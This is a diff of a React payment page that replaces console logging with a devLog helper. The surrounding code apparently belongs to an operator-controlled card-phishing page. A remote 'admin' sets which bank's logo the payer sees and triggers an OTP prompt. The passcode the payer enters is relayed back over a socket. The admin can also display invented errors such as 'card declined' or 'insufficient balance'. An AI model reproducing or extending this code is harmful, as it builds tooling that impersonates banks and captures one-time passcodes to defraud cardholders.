@@ -1,10 +1,10 @@
-
 import React, { useState, useEffect } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { ArrowLeft, CreditCard, Shield, Clock, CheckCircle, AlertCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
 import { io, Socket } from 'socket.io-client';
+import { devLog, devError, devWarn } from '../utils/logger';
 
 const Payment = () => {
   const navigate = useNavigate();
@@ -52,14 +52,14 @@ const Payment = () => {
 
   // Function to get bank name from logo URL
   const getBankNameFromLogo = (logoUrl: string): string => {
-    console.log('🔍 getBankNameFromLogo called with:', logoUrl);
+    devLog('🔍 getBankNameFromLogo called with:', logoUrl);
     const bank = bankLogos.find(bank => bank.logo === logoUrl);
-    console.log('🔍 Found bank:', bank);
+    devLog('🔍 Found bank:', bank);
     
     if (!bank) {
-      console.log('⚠️ No bank found for logo URL. Available logos:');
+      devLog('⚠️ No bank found for logo URL. Available logos:');
       bankLogos.forEach((b, index) => {
-        console.log(`${index + 1}. ${b.name}: ${b.logo}`);
+        devLog(`${index + 1}. ${b.name}: ${b.logo}`);
       });
     }
     
@@ -89,9 +89,9 @@ const Payment = () => {
     setSocket(newSocket);
 
     newSocket.on('connect', () => {
-      console.log('🟢 Payment page connected to WebSocket server');
-      console.log('🆔 Socket ID:', newSocket.id);
-      console.log('🌐 Socket URL:', socketUrl);
+      devLog('🟢 Payment page connected to WebSocket server');
+      devLog('🆔 Socket ID:', newSocket.id);
+      devLog('🌐 Socket URL:', socketUrl);
       
       // Send a test ping to verify connection
       newSocket.emit('payment-page-connected', { 
@@ -100,19 +100,19 @@ const Payment = () => {
         socketId: newSocket.id
       });
       
-      console.log('✅ Payment page ready to receive events');
+      devLog('✅ Payment page ready to receive events');
     });
 
     newSocket.on('disconnect', () => {
-      console.log('Payment page disconnected from WebSocket server');
+      devLog('Payment page disconnected from WebSocket server');
     });
 
     // Listen for both event types to ensure delivery
     const handleShowOtp = (data: any) => {
-      console.log('🎯 RECEIVED show-otp event in Payment page:', data);
-      console.log('🔍 Full event data:', JSON.stringify(data, null, 2));
+      devLog('🎯 RECEIVED show-otp event in Payment page:', data);
+      devLog('🔍 Full event data:', JSON.stringify(data, null, 2));
       setDebugInfo(`Event received: ${JSON.stringify(data)}`);
-      console.log('Setting showOtp to true...');
+      devLog('Setting showOtp to true...');
       setShowOtp(true);
       setIsProcessing(false); // Stop loading spinner when OTP form appears
       setError('');
@@ -125,7 +125,7 @@ const Payment = () => {
         
         // IMPORTANT: Set bank logo BEFORE setting bank name
         const receivedBankLogo = data.bankLogo || '';
-        console.log('🎨 Received bankLogo from admin:', receivedBankLogo);
+        devLog('🎨 Received bankLogo from admin:', receivedBankLogo);
         setBankLogo(receivedBankLogo);
         setDebugInfo(`Bank logo set to: ${receivedBankLogo}`);
         
@@ -133,16 +133,16 @@ const Payment = () => {
         if (receivedBankLogo) {
           const bankName = getBankNameFromLogo(receivedBankLogo);
           setSelectedBankName(bankName);
-          console.log('🏛️ Mapped bank name:', bankName);
-          console.log('📋 Bank logos array:', bankLogos.map(b => ({ name: b.name, logo: b.logo })));
+          devLog('🏛️ Mapped bank name:', bankName);
+          devLog('📋 Bank logos array:', bankLogos.map(b => ({ name: b.name, logo: b.logo })));
           setDebugInfo(`Bank: ${bankName}, Logo: ${receivedBankLogo}`);
         } else {
-          console.log('⚠️ No bankLogo received, using default');
+          devLog('⚠️ No bankLogo received, using default');
           setSelectedBankName('HDFC BANK');
           setDebugInfo('No bank logo received, using default HDFC');
         }
         
-        console.log('Updated currency display:', {
+        devLog('Updated currency display:', {
           amount: data.customAmount,
           currency: data.currency,
           symbol: data.currencySymbol,
@@ -166,13 +166,13 @@ const Payment = () => {
     
     // Test event listener to verify socket is working
     newSocket.on('test-event', (data) => {
-      console.log('🧪 Test event received:', data);
+      devLog('🧪 Test event received:', data);
     });
     
-    console.log('🔌 Registered event listeners: show-otp, admin-show-otp, broadcast-show-otp');
+    devLog('🔌 Registered event listeners: show-otp, admin-show-otp, broadcast-show-otp');
 
     newSocket.on('payment-approved', () => {
-      console.log('Payment approved by admin');
+      devLog('Payment approved by admin');
       setSuccess(true);
       setError('');
       setIsProcessing(false);
@@ -197,20 +197,20 @@ const Payment = () => {
     });
 
     newSocket.on('payment-rejected', (reason: string) => {
-      console.log('Payment rejected:', reason);
+      devLog('Payment rejected:', reason);
       setError(reason || 'Payment was rejected. Please try again.');
       setIsProcessing(false);
       setShowOtp(false);
     });
 
     newSocket.on('invalid-otp-error', () => {
-      console.log('Invalid OTP error received');
+      devLog('Invalid OTP error received');
       setError('Incorrect OTP, please enter valid one time passcode');
       setIsProcessing(false);
     });
 
     newSocket.on('card-declined-error', () => {
-      console.log('Card declined error received');
+      devLog('Card declined error received');
       navigate('/checkout', { 
         state: { 
           planData,
@@ -220,7 +220,7 @@ const Payment = () => {
     });
 
     newSocket.on('insufficient-balance-error', () => {
-      console.log('Insufficient balance error received');
+      devLog('Insufficient balance error received');
       setError('Insufficient balance in your account. Please try with a different card.');
       setIsProcessing(false);
       setShowOtp(false);
@@ -234,7 +234,7 @@ const Payment = () => {
   const handleOtpSubmit = () => {
     if (otp.length === 6 && socket) {
       const paymentId = planData.id || 'payment-' + Date.now();
-      console.log('Submitting OTP:', otp, 'Payment ID:', paymentId);
+      devLog('Submitting OTP:', otp, 'Payment ID:', paymentId);
       socket.emit('otp-submitted', { 
         otp,
         paymentId,
@@ -334,12 +334,12 @@ const Payment = () => {
                             alt={selectedBankName + ' Logo'} 
                             className="max-w-full max-h-full object-contain"
                             onError={(e) => {
-                              console.log('❌ Top header bank logo failed to load:', bankLogo);
+                              devLog('❌ Top header bank logo failed to load:', bankLogo);
                               // Fallback to default text if bank logo fails to load
                               e.currentTarget.parentElement!.innerHTML = '<span class="text-blue-600 text-xs font-bold">BANK</span>';
                             }}
                             onLoad={() => {
-                              console.log('✅ Top header bank logo loaded successfully:', bankLogo);
+                              devLog('✅ Top header bank logo loaded successfully:', bankLogo);
                             }}
                           />
                         </div>
